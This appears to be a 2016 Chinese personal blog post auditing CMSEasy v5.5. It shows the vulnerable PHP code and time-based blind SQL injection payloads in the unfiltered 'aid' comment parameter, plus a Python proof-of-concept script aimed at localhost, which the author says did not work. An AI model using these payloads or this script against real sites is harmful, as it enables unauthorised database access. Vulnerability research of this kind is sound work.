@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      记一次吃屎的cmseasy审计 | sixwhale&#39;s pages
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="sixwhale">
+    
+    
+      <meta name="description" content="0x00 写在前面最近忙着练习写各种PoC 看了好多wooyun镜像里的通用型CMS漏洞 发现cmseasy被x的体无完肤… 我又把 v5.5 看了一遍 于是吃屎 ：）
+0x01 Functionlib/inc/table.php 这个文件里包含了基本所有与数据库操作有关的函数 
+问题函数:function condition(&amp;amp;$condition) &amp;#123;    if (isse">
+    
+
+    <meta name="description" content="0x00 写在前面最近忙着练习写各种PoC 看了好多wooyun镜像里的通用型CMS漏洞 发现cmseasy被x的体无完肤… 我又把 v5.5 看了一遍 于是吃屎 ：）
+0x01 Functionlib/inc/table.php 这个文件里包含了基本所有与数据库操作有关的函数 
+问题函数:function condition(&amp;amp;$condition) &amp;#123;    if (isse">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次吃屎的cmseasy审计 | sixwhale's pages">
+<meta property="og:url" content="http://yoursite.com/2016/12/08/记一次吃屎的cmseasy审计/index.html">
+<meta property="og:site_name" content="sixwhale's pages">
+<meta property="og:description" content="0x00 写在前面最近忙着练习写各种PoC 看了好多wooyun镜像里的通用型CMS漏洞 发现cmseasy被x的体无完肤… 我又把 v5.5 看了一遍 于是吃屎 ：）
+0x01 Functionlib/inc/table.php 这个文件里包含了基本所有与数据库操作有关的函数 
+问题函数:function condition(&amp;amp;$condition) &amp;#123;    if (isse">
+<meta property="og:image" content="http://pic.yupoo.com/sixwhale_s/G3IeXoNe/6bZ87.jpg">
+<meta property="og:image" content="http://pic.yupoo.com/sixwhale_s/G3IiPRa1/11j8Sc.jpg">
+<meta property="og:image" content="http://pic.yupoo.com/sixwhale_s/G3IkXcUu/medish.jpg">
+<meta property="og:image" content="http://yoursite.com/emoji/shit">
+<meta property="og:image" content="http://pic.yupoo.com/sixwhale_s/G3IuEp0d/gv8M8.jpg">
+<meta property="og:image" content="http://yoursite.com/emoji/imp">
+<meta property="og:image" content="http://yoursite.com/emoji/alien">
+<meta property="og:image" content="http://yoursite.com/emoji/boom">
+<meta property="og:image" content="http://yoursite.com/emoji/hankey">
+<meta property="og:image" content="http://yoursite.com/emoji/dash">
+<meta property="og:image" content="http://yoursite.com/emoji/joy">
+<meta property="og:image" content="http://yoursite.com/emoji/nail_care">
+<meta property="og:image" content="http://yoursite.com/emoji/kiss">
+<meta property="og:image" content="http://yoursite.com/emoji/sheep">
+<meta property="og:image" content="http://yoursite.com/emoji/dog">
+<meta property="og:updated_time" content="2016-12-08T10:03:48.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次吃屎的cmseasy审计 | sixwhale's pages">
+<meta name="twitter:description" content="0x00 写在前面最近忙着练习写各种PoC 看了好多wooyun镜像里的通用型CMS漏洞 发现cmseasy被x的体无完肤… 我又把 v5.5 看了一遍 于是吃屎 ：）
+0x01 Functionlib/inc/table.php 这个文件里包含了基本所有与数据库操作有关的函数 
+问题函数:function condition(&amp;amp;$condition) &amp;#123;    if (isse">
+
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css" type="text/css">
+
+    <script src="/js/jquery.min.js"></script>
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+        <a href="/" title="link to homepage for sixwhale&#39;s pages"><img src="/images/avatar.jpg" width="80" alt="sixwhale&#39;s pages logo" class="panel-cover__logo logo" /></a>
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">sixwhale&#39;s pages</a></h1>
+
+        <hr class="panel-cover__divider" />
+        <p class="panel-cover__description">
+          不会画画儿的程序媛不是好黑客_prpr_(ฅ&#39;ω&#39;ฅ)
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">blog</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">me</a></li>
+              
+                
+                <li class="navigation__item"><a href="/blogroll" title="" class="">links</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+------------------------------ -->
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+
+  <!-- Github -->
+  <li class="navigation__item">
+    <a href="https://github.com/sixwha1e" target="_blank">
+      <i class='icon icon-social-github'></i>
+      <span class="label">GitHub</span>
+    </a>
+  </li>
+
+  </ul>
+</nav>
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+  <article class="post-container post-container--single">
+
+    <header class="post-header">
+    
+      
+      <div class="post-meta">
+        <time datetime="2016-12-08" class="post-meta__date date">2016-12-08</time> &#8226; 
+
+        <span class="post-meta__tags tags">
+
+            <font class="categories">
+              
+            </font>
+            
+
+        </span>
+      </div>
+      
+
+      <h1 class="post-title">记一次吃屎的cmseasy审计</h1>
+    </header>
+
+    <section class="post">
+      <h2 id="0x00_写在前面">0x00 写在前面</h2><p>最近忙着练习写各种PoC 看了好多wooyun镜像里的通用型CMS漏洞 发现<strong>cmseasy</strong>被x的体无完肤… 我又把 <strong>v5.5</strong> 看了一遍 于是吃屎 ：）</p>
+<h2 id="0x01_Function">0x01 Function</h2><p><code>lib/inc/table.php</code> 这个文件里包含了基本所有与数据库操作有关的函数 </p>
+<h4 id="问题函数:">问题函数:</h4><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> condition(&amp;<span class="variable">$condition</span>) &#123;</span><br><span class="line">    if (isset(<span class="variable">$condition</span>) &amp;&amp;is_array(<span class="variable">$condition</span>)) &#123;</span><br><span class="line">        $_condition=array();</span><br><span class="line">        foreach (<span class="variable">$condition</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span>=str_replace(<span class="string">"'"</span>,<span class="string">"\'"</span>,<span class="variable">$value</span>);</span><br><span class="line">            $_condition[]=<span class="string">"`$key`='$value'"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$condition</span>=implode(<span class="string">' and '</span>,$_condition);</span><br><span class="line">    &#125;</span><br><span class="line">    else if (is_numeric(<span class="variable">$condition</span>)) &#123;</span><br><span class="line">        <span class="variable">$this-</span>&gt;getFields();</span><br><span class="line">        <span class="variable">$condition</span>=<span class="string">"`$this-&gt;primary_key`='$condition'"</span>;</span><br><span class="line">    &#125;else if(true === <span class="variable">$condition</span>)&#123; //问题的所在</span><br><span class="line">    	<span class="variable">$condition</span> = <span class="string">'true'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>面向整个CMS 进行全局搜索 <code>condition()</code>这个函数 发现<code>lib/default/comment_act.php</code>中<code>add_action()</code>存在问题 这个函数主要功能是写评论</p>
+<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> add_action() &#123;</span><br><span class="line">    if(front::post(<span class="string">'submit'</span>) &amp;&amp;front::post(<span class="string">'aid'</span>)) &#123;</span><br><span class="line">    	if(config::get(<span class="string">'verifycode'</span>)) &#123;</span><br><span class="line">         if(front::post(<span class="string">'verify'</span>)&lt;&gt;session::get(<span class="string">'verify'</span>)) &#123;</span><br><span class="line">              alertinfo(<span class="string">'验证码错误。'</span>, front::<span class="variable">$from</span>);</span><br><span class="line">             //front::redirect(front::<span class="variable">$from</span>);</span><br><span class="line">         &#125;</span><br><span class="line">    	&#125;</span><br><span class="line">        if(!front::post(<span class="string">'username'</span>)) &#123;</span><br><span class="line">            /*front::flash(lang(<span class="string">'请留下你的名字！'</span>));</span><br><span class="line">            front::redirect(front::<span class="variable">$from</span>);*/</span><br><span class="line">        	alertinfo(<span class="string">'请留下你的名字！'</span>, front::<span class="variable">$from</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!front::post(<span class="string">'content'</span>)) &#123;</span><br><span class="line">            /*front::flash(lang(<span class="string">'请填写评论内容！'</span>));</span><br><span class="line">            front::redirect(front::<span class="variable">$from</span>);*/</span><br><span class="line">            alertinfo(<span class="string">'请填写评论内容！'</span>, front::<span class="variable">$from</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$this-</span>&gt;manage-&gt;filter();</span><br><span class="line">        <span class="variable">$comment</span>=new comment();</span><br><span class="line">        <span class="variable">$archive</span>=new archive();</span><br><span class="line">        front::<span class="variable">$post</span>[<span class="string">'state'</span>] = <span class="string">'0'</span>;</span><br><span class="line">        front::<span class="variable">$post</span>[<span class="string">'adddate'</span>]=date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">        <span class="variable">$comment-</span>&gt;rec_insert(front::<span class="variable">$post</span>);</span><br><span class="line">        //echo front::post(<span class="string">'aid'</span>);</span><br><span class="line">        <span class="variable">$archive-</span>&gt;rec_update(<span class="string">'comment=comment+1'</span>,front::post(<span class="string">'aid'</span>));</span><br><span class="line">        //front::flash(lang(<span class="string">'提交成功！'</span>));</span><br><span class="line">        alertinfo(<span class="string">'评论提交成功。'</span>, front::<span class="variable">$from</span>);</span><br><span class="line">        //front::redirect(front::<span class="variable">$from</span>);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        front::flash(lang(<span class="string">'提交失败！'</span>));</span><br><span class="line">        front::redirect(front::<span class="variable">$from</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>验证码这个东西是摆设嘛…?? </li>
+<li><code>front::post(&#39;aid&#39;)</code>完全没有过滤 </li>
+<li>集中看<code>rec_update() -&gt; query_unbuffered() -&gt; query()</code> 正面x 无阻碍</li>
+</ul>
+<h2 id="0x02_吃屎的利用">0x02 吃屎的利用</h2><ul>
+<li><strong>case=*</strong> 绑定的是<code>lib/default/</code>目录下的模块文件 例如<code>*_act.php</code></li>
+<li><strong>act=*</strong> 绑定的是该文件里的功能函数 例如 <code>*_action()</code></li>
+<li><strong>submit,username,content,aid</strong> 直接post传入 <code>aid</code>完全无过滤</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">aid=<span class="number">1</span> ↓↓↓↓↓</span><br></pre></td></tr></table></figure>
+<p><img src="http://pic.yupoo.com/sixwhale_s/G3IeXoNe/6bZ87.jpg" alt=""></p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">aid=<span class="number">1</span> <span class="literal">and</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="built_in">SLEEP</span>(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line">aid=<span class="number">1</span> <span class="literal">and</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="built_in">SLEEP</span>(<span class="number">5</span>),<span class="number">1</span>) ↓↓↓↓↓↓↓</span><br></pre></td></tr></table></figure>
+<h5 id="是不是感觉这语句简直完美_然而并没有延迟_语句出错??_↓↓↓↓↓↓↓↓↓↓↓↓↓↓">是不是感觉这语句简直完美 然而并没有延迟 语句出错??  ↓↓↓↓↓↓↓↓↓↓↓↓↓↓</h5><p><img src="http://pic.yupoo.com/sixwhale_s/G3IiPRa1/11j8Sc.jpg" alt=""></p>
+<h5 id="完全没问题啊_写进去了啊!_↓↓↓↓↓↓↓↓↓↓↓↓↓↓">完全没问题啊 写进去了啊!   ↓↓↓↓↓↓↓↓↓↓↓↓↓↓</h5><p><img src="http://pic.yupoo.com/sixwhale_s/G3IkXcUu/medish.jpg" alt=""></p>
+<h5 id="写个脚本跑一哈？_↓↓↓↓↓↓↓↓↓↓↓↓↓↓">写个脚本跑一哈？  ↓↓↓↓↓↓↓↓↓↓↓↓↓↓</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://localhost/uploads/index.php?case=comment&amp;act=add"</span></span><br><span class="line">    post_data1 = &#123;</span><br><span class="line">        <span class="string">'submit'</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">'1111'</span>,</span><br><span class="line">        <span class="string">'content'</span>: <span class="string">'test'</span>,</span><br><span class="line">        <span class="string">'aid'</span>: <span class="string">'1 and if(1=1,BENCHMARK(10000000,md5(1)),null)'</span></span><br><span class="line">    &#125;</span><br><span class="line">    post_data2 = &#123;</span><br><span class="line">        <span class="string">'submit'</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">'1111'</span>,</span><br><span class="line">        <span class="string">'content'</span>: <span class="string">'test'</span>,</span><br><span class="line">        <span class="string">'aid'</span>: <span class="string">'1 and if(1=2,BENCHMARK(10000000,md5(1)),null)'</span></span><br><span class="line">    &#125;</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    req = urllib2.Request(url, data=urllib.urlencode(post_data1))</span><br><span class="line">    urllib2.urlopen(req)</span><br><span class="line">    end_time_1 = time.time()</span><br><span class="line"></span><br><span class="line">    req2 = urllib2.Request(url, data=urllib.urlencode(post_data2))</span><br><span class="line">    urllib2.urlopen(req2)</span><br><span class="line">    end_time_2 = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'delta_time1: '</span>,(end_time_1 - start_time)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'delta_time2: '</span>,(end_time_2 - end_time_1)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    verify()</span><br><span class="line">    </span><br><span class="line">--------------------------------------------------------------------</span><br><span class="line">delta_time1:  <span class="number">0.180356025696</span></span><br><span class="line">delta_time2:  <span class="number">0.471837997437</span></span><br></pre></td></tr></table></figure>
+<h5 id="说好的时间差呢??_QAQ">说好的时间差呢?? QAQ</h5><h2 id="0x03_reason_of_吃">0x03 reason of 吃<img src="emoji/shit" width="33"></h2><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="variable">$archive-</span>&gt;rec_update(<span class="string">'comment=comment+1'</span>,front::post(<span class="string">'aid'</span>));</span><br></pre></td></tr></table></figure>
+<p>通过我对这个CMS的解读…貌似是压根就没有<code>comment</code>这个字段<br><img src="http://pic.yupoo.com/sixwhale_s/G3IuEp0d/gv8M8.jpg" alt=""><br>就连官网最新版本5.6 也是这个问题 so…这是开发人员的傲娇么 写了个压根就不存在的字段的功能？？当然也许是我理解错了 如果有表哥路过 请指教一下<br>虽然吃屎了 但还是根据另一个延迟注入 写了<a href="https://pan.baidu.com/s/1slAhQpB" target="_blank" rel="external">PoC</a> 是cmseasy投票模块的 与这个情况一致</p>
+<h2 id="0x04_最后">0x04 最后</h2><p>每次文章的最后 都是我的精分区域 发现了个好玩的 不知道能不能显示<br><img src="emoji/imp" width="18"><br><img src="emoji/alien" width="18"><br><img src="emoji/boom" width="18"><br><img src="emoji/hankey" width="18"><br><img src="emoji/dash" width="18"><br><img src="emoji/joy" width="18"><br><img src="emoji/nail_care" width="18"><br><img src="emoji/kiss" width="18"><br><img src="emoji/sheep" width="18"><br><img src="emoji/dog" width="18"><br>说到底 还是因为太菜了 期末了要写很多实验报告</p>
+<p><a href="http://music.163.com/#/m/song?id=38392240" target="_blank" rel="external">惊天动地</a> 循环了好久 不开心（</p>
+
+    </section>
+
+    
+
+<section class="post-comments">
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+      var disqus_shortname = 'sixwhale'; 
+      /* * * DON'T EDIT BELOW THIS LINE * * */
+      (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+
+  </article>
+
+
+            <footer class="footer">
+    <span class="footer__copyright">&copy; 2015-2016 | ❤ <a href="mailto:wjsixwhale@gmail.com">sixwhale </a></span>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- The main JavaScript file for Casper -->
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    <script src="/js/jquery.imagesloaded.min.js"></script>
+    <script src="/js/gallery.js"></script>
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+    <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]}
+    });
+    </script>
+
+    <!--kill ie6 -->
+    <!--[if IE 6]>
+      <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+    <![endif]-->
+
+    <!--  google analytics -->
+    <script>
+      // add your google analytics code here
+    </script>
+
+    <!-- totop -->
+    <div id="totop" style="position:fixed;bottom:50px;right:30px;cursor: pointer;">
+    <a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"/></a>
+    </div>
+    <script>
+    (function($) {
+      var upperLimit = 100;
+      var scrollElem = $('#totop');
+      var scrollSpeed = 500;
+      scrollElem.hide();
+      $(window).scroll(function () {
+        var scrollTop = $(document).scrollTop();
+        if ( scrollTop > upperLimit ) {
+          $(scrollElem).stop().fadeTo(300, 1); // fade back in
+        }else{
+          $(scrollElem).stop().fadeTo(300, 0); // fade out
+        }
+      });
+      $(scrollElem).click(function(){
+        $('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+      });
+    })(jQuery);
+    </script>
+
+    <!-- fancybox -->
+    
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+    <script src="/fancybox/jquery.fancybox.pack.js"></script>
+    <script type="text/javascript">
+      (function($){
+        $('.fancybox').fancybox();
+      })(jQuery);
+    </script>
+    
+
+    <!--  google analytics -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-69756007-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1258121687'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s11.cnzz.com/z_stat.php%3Fid%3D1258121687' type='text/javascript'%3E%3C/script%3E"));</script>
+</body>
+</html>
